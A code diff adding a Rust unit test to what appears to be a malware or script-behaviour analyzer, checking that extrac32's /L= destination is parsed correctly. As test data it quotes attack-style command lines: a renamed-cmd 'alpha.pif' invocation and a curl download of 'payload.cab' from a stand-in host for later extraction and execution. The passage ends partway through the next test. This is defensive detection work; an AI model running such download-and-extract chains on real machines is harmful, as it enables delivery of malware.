@@ -13977,6 +13977,27 @@ C:\Users\Public\alpha.pif /C ping -n 2 127.0.0.1
     }
 
     #[test]
+    fn extrac32_l_equals_value_is_not_treated_as_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /Y /L="C:\Users\Public" "C:\Users\al\Downloads\payload.cab""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Extrac32 { src, dst, .. }
+                    if src == r#"C:\Users\al\Downloads\payload.cab"# && dst == r#"C:\Users\Public"#
+            )
+        });
+        assert!(
+            has,
+            "extrac32 /L= value was parsed as positional source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn extrac32_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o payload.cab https://extrac32-download.example/payload.cab
